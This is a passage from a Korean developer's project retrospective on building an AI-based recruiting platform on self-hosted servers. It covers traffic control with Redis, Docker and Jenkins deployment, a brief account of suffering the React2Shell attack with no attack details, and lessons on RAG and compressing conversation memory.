<p>또한 규모가 크고, 자신들의 기술을 위하여 직접 하드웨어를 가지고 온프레미스로 적용된다면? 일반적인 경우에 비해 고가용성을 얻는데 엄청난 리소스와 최적화가 필요해진다. 여기서 하나의 아이러니가 발생하는데, 그것은 <strong>AI 의 발전으로 커진 시스템을, 다시 과연 AI가 이해할 수 있는가? 라는 부분에 대한 의문</strong>이다. 클라우드 프로바이저들의 제공하는 리소스는 한정되고, 그러는 와중에 실 서비스에 가까운 성능을 내줘야 하고, 동시에 그렇게 비대한 시스템을 가진다면? 이때 생길 비용의 증대는? 이 전체 시스템을 어떻게 통합해서 관리하지? AI 는 가능한가? 여기서 나의 질문의 답은 ‘<strong>가능은 할 것이지만 당장은 아니다</strong>‘였다. 그 비용을 다루고, 완전히 스스로 자가 발전하기 위해선 지금의 하드웨어나, 지금의 AI 방법론, 비용 차원에서 부족하다. 바로 이 지점이 ‘개발자’의 존재 이유라고 생각한다.</p>

<h4 id="구성--증명-그리고-그-이상을-이루기-위한-도전">구성 : 증명 그리고 그 이상을 이루기 위한 도전</h4>
<p>‘증명’하려고 했다. 1년 2개월, 메인 서버 개발자로서의 성과가 결코 ‘과장’이 아님을 증명해야 한다. 이 과정을 통해 나는 AI 를 구축하고, 응용하고, 더 나아가선 AI의 본질을 파악하여 서버를 유지, 보수하고, 고도화 시키는 경험치가 필요하다. 결국 AI 가 하지 못하는 영역은 아키텍쳐에 대한 이해와 각 서비스의 상호작용을 이해하는 것이라 판단했다. AI, DevOps, 그리고 백엔드 이 키워드들을 합쳐 내는 것이 목표가 되었다.</p>

<p>그렇게 기술적으로 달려갈 포인트는 설정 했다. 그렇다면 이번엔 무얼 해결하는 걸 만들 것인가? 그러다 문득 후배의 푸념 섞인 대화, 최근 갔다온 취업 박람회의 HR 담당자의 푸념을 듣고 한 가지 문제에 대해 번뜩이게 되었다. 신입으로 취업하기 어려운 현실, 그런데 동시에 사람이 없다고 이야기 하는 기업들. 왜 서로 말이 다른가? 이 아이러니를 해결할 방법은 없을까?</p>

<p>이 아이러니는 사실 지속적으로 지적되던 이야기다. 신입은 ‘기업이 요구하는게 무엇인가’에 대한 접근이 부실하고, 현실적이지 못하다. 한 마디로 ‘역할’이 요구하는 것이 무엇인지를 파악하지 못한다. 동시에 기업은 ‘일’을 하고 있기에 이러한 현실을 제대로 가르쳐 줄 수 없다. 현실의 제약으로 당장의 결론을 요구할 수 밖에 없다. 이러한 인식의 차이, 데이터의 비대칭성을 해결하는 방법은 없을까?</p>

<p>그 간극을 해결해보고자 프로젝트를 계획했다. 그것이 <code class="language-plaintext highlighter-rouge">Project Protostar(원시성)</code>다. 우주에서 막 먼지들이 뭉쳐 빛을 내며 별이 되려는 시점, 그때 불이 붙도록 돕는 촉매제. AI 를 기반으로 기업 인사들에게는 바쁜 와중에 구직자들의 방대한 자료들을 일일이 볼 필요를 없앤다. 필요한 데이터를 자연어로 요청하고 AI는 이를 효과적으로 전달해줘서 시간과 핵심을 간파한다. 구직자들에게는 AI는 현실에서 기업이 요구하는게 뭔지, 그 질문을 받아 볼 수 있는 창구 역할을 한다. 창구는 곧 구직자의 ‘현실성’을 채우는 동력이 된다. 이러한 구성은 분명 양 극단의 차이나 갭, 소통의 아이러니를 메울 수 있는 도구가 되지 않을까? 생각했고 기획을 진행했다.</p>

<p><img src="/assets/images/posts/2026-02/002.png" alt="" /></p>
<blockquote>
  <p>비즈니스 로직과 AI 워커의 분리, 그리고 관측성을 고려한 인프라 설계</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/003.png" alt="" />
<img src="/assets/images/posts/2026-02/004.png" alt="" /></p>

<p>우선 기술적 목적을 위해, 기획적 목적을 위해 인프라에 대한 설계를 진행했다.</p>

<ul>
  <li>하나의 공유기, 온프레미스 서버 2대의 연동</li>
  <li>HTTPS 정식 포트는 서비스를 위해 쓰지만, 관리를 위한 연결은 TLS proxy pass 로 다른 포트를 HTTPS 로 연결이 가능하게 구성한다.</li>
  <li>모든 서버는 K8s 로 구축된다 -&gt; <strong>실패</strong> -&gt; 이후 Docker 기반으로 구축함</li>
  <li>모든 서버는 Docker 와 하드웨어를 위해 추적 인스턴스를 갖춘다
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Node Exporter / cAdvisor</li>
    </ul>
  </li>
  <li>서브 서버는 모니터링이 주 업무로 한다. 이에 아래의 기술스택을 포함한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Grafana / Prometheus / Loki</li>
      <li><code class="language-plaintext highlighter-rouge">DB</code>: MinIO (RAG 용 자료의 원본 데이터)</li>
    </ul>
  </li>
  <li>메인 서버는 서비스를 주 업무로 한다. 이에 아래의 기술스택을 포함한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Frontend</code>: Next.js</li>
      <li><code class="language-plaintext highlighter-rouge">Backend 1</code>: Nest.js - Business Logic, RateLimiter, Guard, throttle</li>
      <li><code class="language-plaintext highlighter-rouge">Backend 2</code>: FastAPI - OpenAI API - <code class="language-plaintext highlighter-rouge">OpenRouter LLM Serving</code></li>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Promtail</li>
      <li><code class="language-plaintext highlighter-rouge">DB</code>: Redis(Pub/Sub, message), PostgreSQL(pgVector)(DB, VectorDB)</li>
    </ul>
  </li>
</ul>

<p>우선 모든 서비스를 구현하는데 있어 클라우드에서는 비용 문제을 포함하여 여러 제약이 많다고 판단했다. 이런 상황에선 고가용성을 얻기 위한 테스트 등을 하기 쉽지 않다. 이에 온프레미스 환경에서 직접 모두 구현해냄으로써 DevOps 관점에서 그 전체적인 흐름, 특징 등을 제대로 이해하고 싶었다.</p>

<p>VectorDB는 AI 의 RAG 의 핵심 도구이자 그 중에서도 기존의 SQL 로서의 기능과 함께 하이브리드로 사용하기 적절한 postgrSQL 을 채택했다. 비즈니스적으로 구현할 사항은 그대로 SQL을 이용하되, RAG 를 위한 벡터 데이터를 위해선 MinIO 를 기반으로 원본 데이터를 보관하고, VectorDB 를 기반으로 구직자들의 다양한 자료들을 최대한 잘 Parsing 하고, 이를 RAG 하도록 구성했다.</p>

<p>또한 NestJS, FastAPI 를 구분하였는데, 이는 비즈니스 로직의 안정성 내지는 관리를 용이하게 만들며, LLM 과의 통신, AI 기능을 위한 핵심 내용만 FastAPI 가 담당하도록 구성하였다. 이는 장애 전파를 막고 독립적 스케일 아웃을 가능하게 만드려고 했다.</p>

<p>왜냐하면 AI 서비스는 필연적으로 고비용/고부하 작업인데, 결국 아무리 많은 요청이 들어와도 해결하도록 만드는 것을 핵심으로 잡았기에, 유량 제어 계층(Traffic Dam) 아키텍쳐를 NestJS 에 설계 단계부터 구성했다. 이와 연동되어 FastAPI 의 상태 확인 모니터링으로, Worker 가 적절하게 일을 하는 지를 확인하고 이 정보를 Redis 를 활용해 전파, Traffic Dam 이 트래픽 뿐만 아니라 Worker 의 상태에도 맞춰서 동작할 수 있도록 구성했다.</p>

<p>그외의 영역으로는 Redis는 핵심 비동기 큐의 역할로서, LLM 의 추론 및 요청을 받아내는 Worker 와 NestJS 를 독립적으로 구동시키는 핵심 역할을 하게 만들었다. 또한 그 외에도 서버끼리의 통신으로 섬세하게 트래픽 양을 제어, 각 서버가 서로에게 영향을 서로 파악하는 용도의 핵심을 Redis를 선정하였다. 이는 Kafka 나 Rabbit MQ 를 쓸 수도 있었으나, 현실적인 개발 일정, 다른 집중할 영역을 위하여 과감히 구현이 빠르게 가능하므로 선정했다. 또한 TLS Proxy Pass 를 설정한 부분은, 서비스 이용자들의 접근 루트와, 관리자의 루트를 분리함으로 관리와 서비스의 명확한 구분을 위하여 설정하게 되었다.</p>

<p>이렇게 구성하게 된 것은 위에서 언급한 생각들을 정리하여 얻은 결론, 목표를 위함이다.</p>

<ol>
  <li><strong>AI 서비스의 특성을 고려하고, 백엔드의 깊이있는 구현을 위하여 비즈니스와 AI를 분리하고, 실무 수준의 구성을 갖춰낸다.</strong></li>
  <li><strong>유량 제어를 포함, 고가용성을 확보하는 심도있는 테스트 설계, 데이터 기반의 스케일 아웃 전략 고려 등, 가능한 현재의 서버 상황의 가장 최적인 서비스 상태를 구현하는 노력을 해본다.</strong></li>
  <li><strong>AI 챗봇으로 AI가 기억을 가지고, 적절한 답변을 가능하게 구현한다.</strong></li>
  <li><strong>기존 실무에서 사용하고 적용했던 기술들을 직접 재구성해보고, 나의 기술 스택과 인사이트를 독자적으로 구현이 가능한지 검증한다.</strong></li>
</ol>

<h3 id="what-i-learned">What I Learned</h3>

<p><img src="/assets/images/posts/2026-02/005.png" alt="" /></p>
<blockquote>
  <p>Before 테스트 당시 컨테이너 상태 , 제대로 FastAPI 서버 동작 하지 않음…</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/006.png" alt="" /></p>
<blockquote>
  <p>After 테스트 당시 컨테이너, 두배 스케일 아웃 및 새로운 컨테이너(FastAPI)의 동작이 관측 된다.</p>
</blockquote>

<h4 id="네트워크와-서버의-상호작용은-결코-기계적이지-않다">네트워크와 서버의 상호작용은 ‘결코’ 기계적이지 않다</h4>
<p>처음 서버 끼리의 통신을 접했을 때, 그리고 연결시켜서 결과가 나왔을 때, 그 순간은 짜릿했다. 내가 만든 룰과 규칙에 따라 가공되고, 사용자에게 필요한 서비스의 데이터를 내준다. 이것은 아주 심플하고, AI가 등장한 이래로는 아니 그 이전부터 별게 아닌 기초의 영역이었다.</p>

<p><strong>하지만 이번 프로젝트를 진행하기 직전, React2Shell 취약점을 경험하고 나면서 ‘가벼운 생각’은 좀더 진지하게 생각해보게 되었다</strong>. npm 패키지를 통한 악성 코드들, 취약점이 튀어나오고, 그걸 기반으로 시스템을 휘젓는 공격. 온프레미스 서버의 next.js 가 공격 당했을 때는 CPU 사용률을 800%까지 끌어 올렸고, 시스템을 엉망으로 만들었다. 인터넷 회선 장비들이 느려지고, 오작동을 하게 만들었다. 구축한 온프레미스 서버의 프론트 서버가 아닌 서버들 조차 느려지게 만드는 것을 발견하였다. 간단한 api 통신, 그러나 순수하게 짜둔 그것에 취약점이 연결되자 엄청난 일이 일어난 것이다.</p>

<p>그렇기에 고민했다. 이런 일이 있다. 실제로 공격은 당한다. 그렇다면 구현하려고 생각한 Protostar에선 어떻게 대응하면 될까. 그렇기에 토스와 함께 하게된 이 프로젝트에서는, 진짜 실무에 필요한 수준의 가능한 정교한 수준의 Traffic Dam 을 구축해보고자 마음을 먹게되었다. 더불어서버들이 갖춰야 할 다른 Traffic 에 대한 제어 기술들을 가능한 철저하게 찾아보고, Token Bucket, Sliding Window 같은 전략이 어떻게 제어를 하고, 그 결과 trade-off 를 어떤 지점에서 발생되는지를 배우려고 노력했고, 지금 그 과정을 통해 배웠던 내용을 정리해본다.</p>

<p>처음엔 기본 로직만 만든 채 k6 기반의 가상의 사용자를 기반으로 테스트를 진행했다. 수 천번의 연결 요청, 서버는 허덕이고, CPU 이용률은 올라간다. 그렇게 반응의 결과를 받아서, AI와 함께 분석하며 그 의미를 해석하려고 했다. 그 뒤엔 그 기록을 기반으로 Traffic Dam 과 각종 장치들을 통해 얼마나 막는게 가능할지 가정을 세워 보았고, 실제로 After Test 를 통해 비교해보았다.</p>

<p>이러한 과정을 겪으면서, 가장 먼저 깨달은 점은 하드웨어의 특성도 이해하게 된다는 점, 그리고 각 서버들의 구성이나 차이를 특히 이해할 수 있게 되었다는 점이다. Scale-out 에 대한 적용 시의 특징도 파악이 되었다. 결론적으로 1대의 수평 확장을 하더라도, 감당 가능한 트래픽의 수치는 선형으로 대응하지 않으며, 오히려 효율이 83%를 기록하며 트래픽에 대응할 수 있었다.  특히나 이를 위하여 기술적으로 Stateless 하게 만들려고 신경을 썼으며, 서버 사이의 통신을 단순히 서버끼리 연결시키지 않고, Redis 를 통신의 가교로 둠으로써, 소통하는 구조를 구현하였고, 설계 구조나 이론적으로 수평으로 무한히 연결 되도 가능하도록 구현을 진행하였다.</p>

<p>그런데 막상 거기까지 진행하고 나서 신기한 경험을 하게 되었다. <strong>실제 비즈니스 로직과 AI 워커 로직은 상태 정보 없이 동작하도록 구축</strong>하였고, 그렇게 테스트를 했다. 그런데 이상한 버그들이 발생하는 것을 발견하였고, 최종적으로 <strong>‘통신을 수행한다’는 기능으로 인해 오히려 Stateful 한 특성을 가진 경우를 발견하게 되었고, 그것이 오류를 일으키는 것을 발견</strong>할 수 있었다.</p>

<p>대표적으로 Redis를 기반으로 대화의 세션을 이어갈 때, Redis 라는 인메모리 데이터베이스의 특성이 통신과 연동, 특정 작업이 state 적 성격을 띠게 되면서 마치 정상이 아닌데 정상처럼 카운트가 되거나 하는 일들이 벌어졌다. 즉, <strong>암묵적 상태 의존성(Implicit State Dependency)</strong> 가 발생한 것이었다. 이에 대해 알아보면서 <strong>설계적 stateless와 구성 전체의 stateless의 괴리</strong> 라고도 부르는 것이 발생 했음을 알 수 있었다.</p>

<p>또한 Pub/Sub 구조에서 큐에 NestJS 가 작업을 요청하고, AI  Worker 인 FastAPI 가 이 작업을 가져가서 수행, 그 결과를 다시 Redis를 향해 전달하는 구조인데, 이때 뜬금 없이 무중단 배포의 Green/Blue 전략의 특징이 버그를 만들어내기도 하였다. 서버의 롤백과 업데이트 시 대응을 위하여 Green, Blue의 컨테이너가 켜져있는데, Redis 로만 소통을 하다보니, 롤백 등을 위해 대기만 해야하는 한쪽 서버가 함께 동작을 하게 되면서 실제로 NestJS 서버 1대에 Worker 2대가 달라붙어 작업을 처리하는 경우가 생겼다. 이때 버전의 차이, API 의 차이가 생기면 어김없이 버그가 발생했지만, 문제는 표면적으로 그걸 찾아내는 것이 매우 곤란하였다. 서버들은 정상이며, 확인이 되지 않았다. 그러나 Loki 를 통해 서버들 전체의 로깅을 보았을 때, 그때 움직이지 말아야 하는 서버가 동작하고 있음을 보았을 땐… 여러모로 십년 묵은 체증이 내려간 기분이었다.</p>

<p>결론적으로 디버깅하는 과정에서 ‘스케일 아웃을 신경썼다’, ‘Stateless 가 되도록 로직을 짰다’ 라는 내 생각이 무색해지는 경험을 하고 말았다. <strong>서버 끼리의 상호작용, redis 등의 중간 연결체 등이 설정이 되었을 때 결코 ‘계산기’처럼 반응이 일정하게 나오지 않는다는 사실을 배운 것은 매우 값진 결과였다.</strong> 각각은 분명 Stateless인데(설계저 stateless), 그것들이 묶이고, 함께 동작하니(구성 전체의 stateless) 그때의 오작동은 찾아내기도 어렵고, 무엇보다 AI 는 이런 전체적인 맥락을 읽지 못했다. 결국 사람의 도전, 경험, CS 에 대한 이해도가 있어야만 이러한 일이 발생함의 힌트라도 얻을 수 있다는 사실은, 상당히 의미있는 배움이 되었고, 서비스의 설계 속에서 반드시 고려할 요소임을 알게 되었다. 결과적으로 <strong>Sticky Session 전략</strong>으로 session 을 강제하는 등의 방법론을 통해 개선 가능했다.</p>

<h4 id="infrastructure-의-구축이-가지는-가치를-실감하다">Infrastructure 의 구축이 가지는 가치를 실감하다</h4>

<p><img src="/assets/images/posts/2026-02/007.png" alt="" /></p>
<blockquote>
  <p>톡톡히 도움을 준 Jenkins</p>
</blockquote>

<p>이번 Protostar 프로젝트에서 프론트엔드와, 백엔드, 백엔드는 NestJS에서 FastAPI, 모니터링, DB들 … 여러 기술 스택을 도전하면서 계속해서 부딪히고 깨지길 반복했다. 각기 개별의 문제, AI 의 삽질, 그리고 그것들에 대해 진한 고민들. 조그만 게 하나씩 개선되어가는 일련의 작업들은 언뜻 도전적인 성장과 도전적인 변화를 일으켰다.</p>

<p>거기서 내가 무얼 잘했던가? 라고 한다면 사실 개발적인 영역은 결코 아닐거라 생각한다. 언어가 익숙할 뿐 React를 비롯 Next.js 에대한 이해도는 낮았으며, FastAPI 는 특히 기본 구조 자체가 Node 의 그것과 유사하여 NestJS 를 생각하면 안되는 것이다. 앞으로 계속해서 개선의 여지는 존재 한다. 그러나 <strong>여기서 분명 내가 잘한 부분은 무엇인가? 하면 ‘전체 구조의 설계’가 시작부터 어느 정도 완결성을 갖추고 시작했다는 점이다.</strong></p>

<p>Jenkins를 기반으로 CI/CD 의 파이프라인을 구축하고 GHCR를 활용해 이미지를 기록, 그리고 그것의 배포는 SSH에 키를 기반으로 진행된다. 그리고 이렇게 진행 될 때도 Green / Blue 를 빌드 번호를 기반으로 번갈아 업데이트 하는 구조를 가지고 있으며, 선택적으로 양쪽 다 업데이트가 가능하도록 설정한 Jenkinsfile의 구성. 실무에서 사용하던 도구들, 그때는 다소 누더기 같이 누벼져 있었으며 IaC(Infrastructure as Code)가 아닌 상태였다.</p>

<p>그때의 불편하고, 생산성을 방해하던 아쉬운 점들을 종합해서 <strong>‘재현 가능한 인프라(Reproducible Infrastructure)’</strong> 를 구현해냈다. 이렇게 구추된 전체 CI/CD 파이프라인은 내 작업의 과정에서 단 한번의 에러 없이 지속적으로 배포의 탄력을 유지하게 해주었다. 롤백을 원할 땐, main 브랜치를 롤백하면 되는 것이었고, 급한 경우 nginx 를 통해 서비스를 제공할 Gree/ Blue 를 수동 조작도 가능했다. 시스템은 망가지지 않으며, 어떤 식으로든 7/24 마음껏 개발-검증-배포를 가능하게 만들었다. 하루에 백번 조금 모자라게 업데이트를 시도할 수 있단 사실은 그것 만으로도 얼마나 ‘탄력적’이겠는가!</p>

<p>또한 <strong>품질 게이트(Quality Gate)</strong> 를 설정하여 코드를 formater, linter 등으로 Jenkinsfile을 통해 빌드 전에도 반드시 검사를 하도록 했다. 또한 CodeRabbit AI 라는 코드 검사 전용 AI를 코드 머지 및 배포 과정에 시스템적으로 배치시켰다. 이는 개인의 임의로 코드의 이상이나 버그를 급하다고 무조건 넘기지 않고, 자연스럽게 디버깅하는 과정을 넣는 결과로 이어졌다. 그러니 진행 과정에서 불안이나 부담을 느끼는게 아닌 ‘절차’ 그 자체로 만들었고, 이러한 방법을 적용했을 때, 배포 시에 코드 상에 문제로 버그가 발생할 일은 최대한 막을 수 있었다.</p>

<p>처음에 온프레미스 서버는 부담 그 자체였다. 구매의 비용도 비용이고, 그 구성에 일일히 설정하는 것, 개발도 전에 먼저 파이프라인을 구축하는 것은 사실 완전히 ‘빠른 개발’과 ‘빠른 배포’에 다소 어긋나는 것일지도 모르겠다. 차라리 효율성을 위해 AWS나, GCP 를 빌릴 수도 있다.</p>

<p>그러나 인프라의 모든 레이어를 직접 제어, <strong>샌드박스로서</strong> 1달의 개발 과정에서 빠른 try &amp; catch error 를 할 수 있다는 점은 백엔드 개발자의 경험치 극대화의 최적화된 방법론이라 생각한다. <strong>스스로 온전히 전체를 이해함으로써 비용 효율적인 고가용성을 설계하는 방법을 보고 느끼며 습득할 수 있었다.</strong> 이러한 경험을 기반으로 향후에는 배포를 위한 템플릿을 준비해둠으로써 프로젝트의 안정적인 개발을 어떻게 하면 될지를 배울 수 있던 기회였다 생각한다.</p>

<p><img src="/assets/images/posts/2026-02/008.png" alt="" />
<img src="/assets/images/posts/2026-02/009.png" alt="" /></p>
<blockquote>
  <p>무료임에도 Code 퀄리티 상승에 톡톡한 역할을 한 CodeRabbit AI 서비스, AI 끼리 싸움을 붙였다(?)</p>
</blockquote>

<h4 id="도전-그리고-반복을-통해-얻어간-devops">도전, 그리고 반복을 통해 얻어간 DevOps</h4>
<p>본 프로젝트는 Protostar 프로젝트의 하위에서 트래픽의 제어, AI 챗봇 구현에 집중한 프로젝트이긴 했다. 그러나 앞서 설명했듯 현대적 DevOps를 이해하고 적용, k8s 의 실무적 도입 및 Docker 환경에서 탈출하는 것이 상당한 의미가 있으리라 판단했다.</p>

<p>Docker의 기술적 열세, k8s 기반의 실무 및 Iac(Infrastructure as Code)에서의 Docker 가 아닌 다른 기술들을 표준으로 도입했다. 시스템의 유사한 기능으로 발생하는 이중 오버헤드를 버리고, 리눅스의 순수한 컨테이너 시스템을 적극 도입했으며, 이는 더욱 안정적인 고가용성을 확보한다는 목표를 달성했고 실제로 많은 기업들이 이 방향성을 따라가고 있다. 그리하여 3년차 이상의 연차를 가지는 백엔드 개발자의 핵심 역량으로 이미 거의 확정적으로 많은 회사들이 요구하는 기술이다. 그렇기에 나 역시 피할 수 없이 배워야 하는 영역이라고 할 수 있다.</p>

<p>하지만 막막했다. 어떻게 배워야 하고, 어떻게 DevOps 의 역량으로 키워야 한단 말인가? 그렇다고 문서만 보고 한 세월 방대한 자료와 씨름을 해야 하는 건가? 사수도 없이, 스스로 모든 걸 하겠다고 하기엔 프로젝트의 달성이란 현실적인 목표 사이에서 욕심 많고 교만한 행동이라고 판단했다. 처음엔 CSI 설정이나 ArgoCD 기반의 GitOps 구성에서 어디서 어떻게 에러가 나는지를 이해하기도 쉽지 않았다. 그렇기에 AI 를 기반으로 최대한 구조를 베껴가면서 k8s 를 프로젝트 하기 전 배워나갔고, 헬름 차트를 기반으로 고가용성을 구축한 패키지를 따라서 설치하는 식으로 제대로 k8s 내부에서의 배포 환경을 구축하려고 했으나… <strong>결론적으로 본 프로젝트, 한 달 내에서는 이루지 못한다고 판단, 포기하였고, Docker 를 다시 채택하여 진행을 하게 되었다.</strong></p>

<p>이유는 심플하다. AI 를 기반으로 배우면서 작업이 들어가는데, 1) 구성의 복잡도를 제로 베이스에서 구현하기는 어려웠다. 2) 특히 각 구성 요소들의 민감한 버전관리를 이해해야 하는데 AI조차 이를 이해하지 못했다. 특히나 3) 버전에 따른 스크립트 설정의 문법의 차이, 4) 실무 수준에서 사용하는 차트에 대하여 AI에 의존해서 AI 가 제작한 스크립트 코드들은 전혀 동작하지 않았고, 오류를 뿜었다. 결국 <strong>핵심은 k8s 를 만만하게 보았고 동시에 AI의 수준을 제대로 인지하지 못한, 과도한 의존이 문제인 것이다.</strong></p>

<p>그리하여… 나에게 결단이 필요했다. 토스의 러너스 하이 2기를 시작하기 직전이었고 더 이상의 딜레이, k8s 를 안고 가기엔 시간이 더 걸리고, 그러면 전체 개발의 목표를 달성하기엔 쉽지 않을 것이란 계산이 되었다. 그렇기에 과감한 결단을 내릴 필요가 있었고, 그 뒤에 해야할 일은 밤낮을 가리지 않는 Docker 기반으로의 회귀, 반복되는 마이그레이션 및 배포 파이프라인에 대한 반복적인 연습이었다.</p>

<p><strong>결론적으로, 그렇게 반복, 실패, 재도전과 개선 작업 등을 반복적으로 진행했다. 사실 뼈 아픈 실패였다.</strong> 그럼에도 긍정적으로 생각할 수 있는 점은 정상적인 배포 파이프라인, 구성들이 동작하게 만들기 위한 무한의 반복, 실패, 마이그레이션의 경험은 DevOps 라는 영역의 요소들에 대한 이해도, 사용 방법에 익숙해졌다는 점이다. 관리 시 뭘 보아야 하고, 에러가 나면 무얼 먼저 챙겨야 하는지 등을 알게 되었다. 특히 Docker 환경에서의 로컬, 프로덕션을 가리지 않고 매우 다양한 컨테이너들 사이에서 오케스트레이션 경험치를 쌓을 수 있었다. <strong>결국 실패와 반복은 성장으로 이어진다는 점을 명확히 배울 수 있었다.</strong></p>
<h4 id="ai는-프롬프트와-데이터-그리고-알고리즘의-전략성이-만들어낸다">AI는 프롬프트와 데이터, 그리고 알고리즘의 전략성이 만들어낸다</h4>
<p>AI를 도입하는 과정 역시 상당한 사건들이 있었고, 많은 것들을 배울 수 있었다.</p>

<p>처음엔 Protostar 의 컨셉에 부합하는 AI 답변이 가능할까? 를 우선 검증하고 싶었다. 이에 n8n을 활용해서 AI 호출, AI에게 요청하는 것을 테스트 해보았고, 특히 <code class="language-plaintext highlighter-rouge">planner</code>, <code class="language-plaintext highlighter-rouge">executor</code>, <code class="language-plaintext highlighter-rouge">inspector</code> 라는 별도의 역할을 부여하고, 로직대로 답변이 나오는지를 판단해보는 작업은 꽤나 신기한, 개발답지 않은 개발이었다.</p>

<p>그러나 막상 구성해본 결과는 다소 실망스러웠다. 우선 여러 단계를 거치는 식은 당연히 성능적 손해(지연시간, TTFT)가 크게 보였다. GPT-OSS-120B, gemini 2.5, 3.0등 왠만한 frontier 모델들, 그 외에도 여러 오픈 소스 모델 등등 OpenRouter 를 기반으로 테스트 해본 결과, 답변은 잘해주더라도 만족스러운 결과에 도달하진 못하는 것을 알 수 있었다. 특히 추론 비용(Token Cost)에서 불리한데, 심지어 긴 컨텍스트 창을 제공하는 gemini 모델들을 볼 땐, 차라리 모든 명령을 프롬프트로 적절하게 집어 넣고, <strong>단일 AI로 출력하는게 답변이 다중의 구조를 추가하는 것 만큼이나 이미 충분히 좋았다. 굳이 돌아가는 길을 갈 필요는 없던 것이다.</strong> 특히 3.0 버전 제미나이의 경우 비추론 모델이 오히려 추론 모델보다 시스템 프롬프트의 복잡성을 추가시 더 명료한 결과가 나오는 기이한 결과가 여기 저기 벤치상으로 나타났고, 응용 어플리케이션에선 최선이라고 판단되었다. (심지어 가장 싸다)</p>

<p><strong>뿐만 아니라, 구현 과정에서 느끼게 된 핵심은 ‘프롬프트’에 대한 엔지니어링의 중요성 부분이었다.</strong> 간단하게 모델 PoC만을 구현하고, AI Worker의 로직을 실증하기 위해, 이력서 데이터, 나의 개인정보를 프롬프트로 추가하고, 단일 모델, 그것도 수십권 분량의 토큰을 입력으로 받을 수 있는 모델을 사용했다. 그런데 결론은? 놀랍게도 AI 는 이력서의 데이터를 받아 들이자마자 <strong>특이한 행동</strong>을 하는 것을 발견했다.</p>

<p>이력서나, 경력 기술서 등, 이러한 문서가 들어오자 AI 는 제시하는 ‘요구사항’의 답을 하는 것을 우선시 하는게 아니라, <strong>프롬프트로 자료의 성격에 맞춰, 이력을 소개하는 답만 반복적으로 출력했다</strong>. 이는 <strong>‘자료 편향(Data Bias)’</strong> 이란 현상이다. 사용한 데이터에 따라 뒤에 올 가능성이 가장 높은 말을 하는게 LLM 이다보니, 이러한 과도한 데이터가 프롬프트, 체계없이 들어오는 순간 실제 요구사항은 희석되고, 데이터가 제시하는 방향성을 따르게 된다. 그 결과 이력서, 경력 기술서란 곧 홍보를 위한 글이다보니, ‘사람 처럼’ 자신의 능력을 어필하기만 하는 고장을 경험하게 되었다.</p>

<p>뿐만 아니라, 데이터들의 선별에도 곤란함을 겪었는데, 고작 A4 10장 정도의 데이터를 기반으로 여러번 질문했다. 순수하게 아무런 기교 없이 프롬프트로 넣은 그것들은 데이터들의 구체적인 정보 한 줄을 설명하지 못했다. <strong>항상 뭉뚱그려진 데이터를 어수룩하게  답변을 했다.</strong> 또한 경력 자료의 특성 상 수치나 실질적인 성과에 대한 이야기를 하게 되는데, 이때 이 수치적인 부분의 누락은 치명적인 영역이었다. 함부로 이상한 수치로 바꿔 말하는 순간, 신뢰성을 어떻게 확보하겠고, 이 서비스를 누가 쓰겠는가? 그렇기에 결국 도달한 결론이 RAG(검색 증강 생성)이 필수 였으며, 연관성을 위한 자료의 적절한 파싱, Vector 화 및 VectorDB의 필요성이 대두되었다.</p>

<p>여기서도 Vector 화를 위하여 문자를 파싱하는데 단순하게 ‘개행 단위’로 할 것인가? 아니면 어떤 식으로든 원본 데이터를 ‘AI 가 이해하기 편한 형태’로 만들 것인가? 라는 질문을 할수 있었고 실제로도 데이터의 질이 조금만 달라도 파편화된 데이터, 정보를 정확하게 설명하지 못하는 것을 볼 수 있었다. 이리저리 테스트 해본 결과 지금은 <strong>‘문단 단위’로 파싱하는 것</strong>을 기본으로 삼았다. 이렇게 하는 것이 헤더 단위에서의 전체 내용을 포함하기 용이했기 때문이다. 단순 개행은 의미적 응집성이 약하며, 정보의 완결성 유지가 애매하기 때문이다. 또한 원본 데이터를 가능한 핵심, 키워드, 내용을 함께 묶어서 AI 가 키워드 기반 Retrieval(Top-K)방식으로 신뢰도를 확보했다.</p>

<p>이젠 대화의 ‘기억력’을 만들어야 하는 시점이 되었다. RAG 를 구축하고, DB를 통해 vector화된 데이터, 이를 위한 업로드 로직까지 했지만 한번 대화 이후 새로운 요청에는 기억을 상실한 채 답변을 할 뿐이었다. <strong>이용자들에게 맥락을 이어가는 질문을 할 수 없다는 것은 사용성에서 치명적이라고 생각했다.</strong> 한편으론 프롬프트로 데이터를 채워서 진행할 수 있었으니, 아주 간단하게 기억력 구현을 생각하면 기존의 대화를 ‘기존 대화’라는 형태로 묶어서 데이터를 보내면 얼추 되기는 하다는 점을 알 수 있었다. 하지만 현실적으로, 그렇게 할 경우 입력과 출력의 ‘토큰량’은 감당할 수 없을 만큼 폭증하는 것은 자명했다.</p>

<p>그렇기에 고민한 결과, 대화를 가능한 ‘한~두 문장’으로 ‘압축’하는 비즈니스 로직을 새롭게 설계했다. AI Worker 가 답변을 생성 후, 다음 요청 전에 worker 가 다시 별도로 작업을 생성, Redis 에 등록하여 요약을 비동기로 수행하도록 구현해보았다. <strong>결과적으로 동일한 질문을 진행했을 때 토큰 압축을 통한 기억력은 매우 명료한 기억을 가지고 있으면서도, 원본 대비 약 73% 수준의 입력 토큰 수량 감소를 달성했다.</strong> 단순하게 전체 입력에 추가하는 것 대비 <strong>1.63회</strong>만 이렇게 압축해도 비용 효용성이 발생했다. 이로서 2턴 이상의 대화는 원본 대비 3 ~ 4배 정도의 비용절감이 발생할 수 있게 되었다.</p>

